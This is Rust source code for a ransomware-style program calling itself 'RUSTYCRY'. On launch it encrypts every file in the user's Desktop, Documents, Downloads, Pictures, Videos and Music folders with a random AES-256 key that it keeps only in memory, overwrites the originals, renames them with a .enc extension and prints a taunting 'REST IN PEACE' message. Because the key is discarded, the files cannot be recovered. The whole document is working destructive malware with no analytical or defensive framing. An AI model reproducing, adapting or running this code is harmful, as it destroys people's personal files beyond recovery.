use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use walkdir::WalkDir;
use rand::rngs::OsRng;
use rand::RngCore;
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::path::PathBuf;
use dirs::{desktop_dir, document_dir, download_dir, picture_dir, video_dir, audio_dir};

type EncCbc = Cbc<Aes256, Pkcs7>;

fn encrypt() {
    let (key, iv) = key_iv();
    let common_dirs = vec![
        desktop_dir(),
        document_dir(),
        download_dir(),
        picture_dir(),
        video_dir(),
        audio_dir(),
    ];
    
    for dir in common_dirs {
        if let Some(path) = dir {
            if let Err(e) = stomp(key, iv, path) {
                eprintln!("Failed to process directory {:?}: {}", path, e);
            }
        }
    }

    for _ in 0..100 {
        println!("REST IN PEACE: YOUR FILE SYSTEM - YOURS FAITHFULLY, RUSTYCRY");
    }

    println!("\nPress Enter to exit...");
    let mut input = String::new();
    if let Err(e) = std::io::stdin().read_line(&mut input) {
        eprintln!("Failed to read user input: {}", e);
    }
}

fn key_iv() -> ([u8; 32], [u8; 16]) {
    gen_key_iv()
}

fn gen_key_iv() -> ([u8; 32], [u8; 16]) {
    let mut key = [0u8; 32];
    let mut iv = [0u8; 16];
    let mut rng = OsRng;

    rng.fill_bytes(&mut key);
    rng.fill_bytes(&mut iv);

    (key, iv)
}

fn stomp(key: [u8; 32], iv: [u8; 16], start_dir: PathBuf) -> io::Result<()> {
    for entry in WalkDir::new(start_dir) {
        let entry = entry?;
        if entry.file_type().is_file() {
            let path = entry.path().to_path_buf();
            if let Err(e) = encrypt_file(&path, &key, &iv) {
                eprintln!("Failed to encrypt {:?}: {}", path, e);
            }
        }
    }
    Ok(())
}

fn encrypt_file(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) -> io::Result<()> {
    let content = read_content(path)?;
    let cipher = EncCbc::new_from_slices(key, iv)?;
    let encrypted_data = cipher.encrypt_vec(&content);
    write_content(path, &encrypted_data)?;
    rename_file(path)?;
    println!("Successfully encrypted: {:?}", path);
    Ok(())
}

fn read_content(path: &PathBuf) -> io::Result<Vec<u8>> {
    let mut file = File::open(path)?;
    let mut content = Vec::new();
    file.read_to_end(&mut content)?;
    Ok(content)
}

fn write_content(path: &PathBuf, content: &[u8]) -> io::Result<()> {
    let mut file = File::create(path)?;
    file.write_all(content)?;
    Ok(())
}

fn rename_file(path: &PathBuf) -> io::Result<()> {
    let new_name = format!("{}.enc", path.to_str().unwrap());
    fs::rename(path, new_name)?;
    Ok(())
}

fn main() {
    encrypt();
}
